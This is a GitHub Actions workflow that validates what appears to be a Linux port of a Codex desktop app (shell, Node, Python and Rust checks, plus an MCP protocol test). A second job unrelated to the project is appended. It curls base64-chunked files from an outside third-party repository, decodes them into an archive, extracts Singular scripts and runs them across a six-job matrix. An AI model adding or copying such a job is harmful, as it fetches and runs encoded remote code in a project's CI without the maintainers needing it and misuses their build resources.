name: Source Checks

on:
  pull_request:
  push:
    branches:
      - main

permissions:
  contents: read

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5

      - name: Setup Node.js
        uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444 # v5
        with:
          node-version: "24"
          cache: npm

      - name: Install validation tools
        run: |
          sudo apt-get update
          sudo apt-get install -y appstream shellcheck

      - name: Install npm dependencies
        run: npm ci --include=dev

      - name: Audit npm dependencies
        run: npm audit --audit-level=high

      - name: Validate shell, Node, and Python scripts
        run: |
          bash -n scripts/*.sh scripts/internal/*.sh scripts/debian/postinst scripts/debian/postrm
          shellcheck scripts/*.sh scripts/internal/*.sh scripts/debian/postinst scripts/debian/postrm
          node --check build/after-pack.js
          node --check build/linux-ui-patch.js
          node --check build/linux-browser-pip.cjs
          node --check build/linux-browser-pip-preload.cjs
          node --check native/node-repl/server.mjs
          PYTHONPYCACHEPREFIX="${RUNNER_TEMP}/pycache" python3 -m py_compile \
            native/node-repl/extract-prompts.py \
            native/node-repl/patch-browser-docs.py \
            scripts/internal/test-node-repl.py
          appstreamcli validate --no-net assets/metainfo/io.openai.codex.desktop.metainfo.xml

      - name: Verify Node REPL MCP protocol
        run: python3 scripts/internal/test-node-repl.py

      - name: Validate GitHub Actions workflows
        run: go run github.com/rhysd/actionlint/cmd/actionlint@v1.7.12

      - name: Validate Rust helper
        working-directory: native/sky-wayland
        run: |
          cargo fmt --check
          cargo clippy --all-targets --all-features --locked -- -D warnings
          cargo test --all-targets --all-features --locked
          cargo build --locked --bins

      - name: Verify Computer Use MCP protocol
        run: |
          python3 - <<'PY'
          import json
          import subprocess

          expected = {
              "list_apps",
              "get_app_state",
              "click",
              "drag",
              "scroll",
              "press_key",
              "type_text",
              "set_value",
              "select_text",
              "perform_secondary_action",
          }
          requests = [
              {
                  "jsonrpc": "2.0",
                  "id": 1,
                  "method": "initialize",
                  "params": {
                      "protocolVersion": "2025-06-18",
                      "capabilities": {},
                      "clientInfo": {"name": "ci", "version": "1"},
                  },
              },
              {"jsonrpc": "2.0", "method": "notifications/initialized", "params": {}},
              {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}},
          ]
          result = subprocess.run(
              ["native/sky-wayland/target/debug/sky_mcp"],
              input="".join(json.dumps(request) + "\n" for request in requests),
              text=True,
              capture_output=True,
              check=True,
              timeout=10,
          )
          responses = [json.loads(line) for line in result.stdout.splitlines()]
          assert responses[0]["result"]["serverInfo"]["name"] == "codex-computer-use-linux"
          assert {tool["name"] for tool in responses[1]["result"]["tools"]} == expected
          PY

  jc2-unit-certificate-replay:
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-24.04, ubuntu-22.04]
        branch: [1_3, 2_5, 3_7]
    runs-on: ${{ matrix.os }}
    timeout-minutes: 30
    steps:
      - name: Checkout
        uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5

      - name: Fetch, restore, and verify the pinned certificate bundle
        run: |
          set -euo pipefail
          mkdir -p jc2-certs/chunks
          base='https://raw.githubusercontent.com/xdLawless2/horseflow/2fcf24f55548452ffbbb806528e4c8e2b4caa98a/jc2-72108-ci'
          for i in 00 01 02 03; do
            curl --fail --location --retry 5 "$base/certs.b64.$i" -o "jc2-certs/chunks/certs.b64.$i"
          done
          cat jc2-certs/chunks/certs.b64.* | base64 -d > jc2-certs/certs.tar.xz
          echo '17a6e1522930a1ea4da025ec48299fd00bb5ca9a1150514213971a75f6b77e54  jc2-certs/certs.tar.xz' | sha256sum -c -
          mkdir jc2-certs/scripts
          tar -xJf jc2-certs/certs.tar.xz -C jc2-certs/scripts
          echo 'ad032eb334b677ec9ead615f17e23194ea675fd42db8d806bee568217c9bd301  jc2-certs/scripts/certificate_1_3.sing' | sha256sum -c -
          echo '6c6daa815089e3465f683cdb3979284c2f0fcd1bb1c44bec341fe56485ecb5ab  jc2-certs/scripts/certificate_2_5.sing' | sha256sum -c -
          echo 'b939e475a03e7b22fbfe6efb07cdf90738ea0f25490138c112342d8692bfd50f  jc2-certs/scripts/certificate_3_7.sing' | sha256sum -c -

      - name: Install Singular
        run: |
          set -euo pipefail
          sudo apt-get update -qq
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y singular
          Singular --version | tee singular-version.log

      - name: Replay exact unit certificate
        run: |
          set -euo pipefail
          Singular -q jc2-certs/scripts/certificate_${{ matrix.branch }}.sing | tee replay-${{ matrix.branch }}.log
          grep -q "BRANCH ${{ matrix.branch }}: UNIT_CERTIFICATE_VERIFIED" replay-${{ matrix.branch }}.log
          ! grep -q 'FAILURE' replay-${{ matrix.branch }}.log

      - name: Upload replay logs
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: jc2-replay-${{ matrix.os }}-${{ matrix.branch }}
          path: |
            replay-${{ matrix.branch }}.log
            singular-version.log
